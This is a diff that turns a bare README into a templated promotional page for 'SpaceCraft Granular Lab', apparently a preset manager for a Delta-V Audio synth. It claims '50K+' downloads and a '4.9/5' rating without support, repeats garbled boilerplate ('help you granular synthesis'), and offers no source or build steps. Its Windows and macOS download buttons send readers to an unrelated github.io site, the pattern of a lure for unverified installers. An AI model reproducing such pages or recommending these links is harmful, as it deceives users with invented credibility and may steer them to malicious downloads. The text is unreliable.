@@ -1,2 +1,91 @@
-# spacecraft-granular-lab
-Granular synthesis and space texture preset lab for Delta-V Audio SpaceCraft
+# ⚡ SpaceCraft Granular Lab
+
+<p align="center">
+  <img src="https://img.shields.io/badge/Downloads-50K%2B-8E44AD?style=for-the-badge&logo=github" />
+  <img src="https://img.shields.io/badge/Rating-4.9%2F5-8E44AD?style=for-the-badge&logo=star" />
+  <img src="https://img.shields.io/badge/Version-Latest-101010?style=for-the-badge&logo=github" />
+  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
+  <img src="https://img.shields.io/badge/Audio%20Plugins-8E44AD?style=for-the-badge" />
+</p>
+
+**⚡ SpaceCraft Granular Lab** — Granular synthesis and space texture preset lab for Delta-V Audio SpaceCraft. SpaceCraft Granular Lab organizes your Delta-V Audio SpaceCraft granular synthesis presets. Build cosmic texture and evolving space sound libraries, save grain cloud configurations and manage ambient patch collections.
+
+<p align="center">
+  <img src="https://skillicons.dev/icons?i=windows" />
+  <img src="https://skillicons.dev/icons?i=apple" />
+  <img src="https://skillicons.dev/icons?i=github" />
+</p>
+
+<p align="center">
+  <img src="https://readme-typing-svg.herokuapp.com?color=8E44AD&size=28&center=true&vCenter=true&width=900&lines=SpaceCraft+Granular+Lab;⭐+Granular+synthesis+and+space+texture+preset+lab+for+Delta-V+Audio+SpaceCraft;🚀+Space+Textures;🔥+Grain+Configs" />
+</p>
+
+<div align="center">
+
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
+
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
+
+</div>
+
+<div align="center">
+<img width="200" alt="SpaceCraft Granular Lab logo" src="https://raw.githubusercontent.com/LiquidFlyerChaos38/spacecraft-granular-lab/main/logo.png" />
+</div>
+
+---
+
+## 📖 About
+
+🔹 **SpaceCraft Granular Lab** is a powerful tool built to help you granular synthesis and space texture preset lab for Delta-V Audio SpaceCraft. SpaceCraft Granular Lab organizes your Delta-V Audio SpaceCraft granular synthesis presets. Build cosmic texture and evolving space sound libraries, save grain cloud configurations and manage ambient patch collections.
+
+🔸 Whether you're a seasoned professional or just getting started, **SpaceCraft Granular Lab** delivers a clean, intuitive experience packed with everything you need — right out of the box. Join thousands of users who've already streamlined their audio plugins workflow. Download now and get started in minutes. 🚀
+
+---
+
+## 🚀 Features
+
+| **Feature** | **Description** |
+|:---|:---|
+| **Space Textures** | Organize cosmic texture presets by density and movement |
+| **Grain Configs** | Save grain size, speed and scatter configurations per patch |
+| **Ambient Libraries** | Build evolving ambient and space sound collections |
+| **Cinematic Banks** | Create cinematic space texture preset banks for film scoring |
+
+---
+
+## 📋 System Requirements
+
+| **Component** | **Windows** | **macOS** |
+|---------------|-------------|-----------|
+| **OS** | Windows 10/11 (64-bit) | macOS 12 Monterey or later |
+| **RAM** | 4 GB+ | 4 GB+ |
+| **Storage** | 2 GB free | 2 GB free |
+| **Processor** | Intel i5 / AMD Ryzen 5 | Intel or Apple Silicon |
+
+---
+
+## ⚠️ Legal Disclaimer
+
+| ✅ Allowed | ❌ Not Allowed |
+|------------|----------------|
+| Personal use | Commercial redistribution |
+| Education | Resale |
+| Research & testing | Modification of source files |
+
+---
+
+**SpaceCraft Granular Lab** — Granular synthesis and space texture preset lab for Delta-V Audio SpaceCraft.
+
+<div align="center">
+
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
+
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
+
+</div>
+
+<p align="center">
+  <img src="https://skillicons.dev/icons?i=windows" />
+  <img src="https://skillicons.dev/icons?i=apple" />
+  <img src="https://skillicons.dev/icons?i=github" />
+</p>
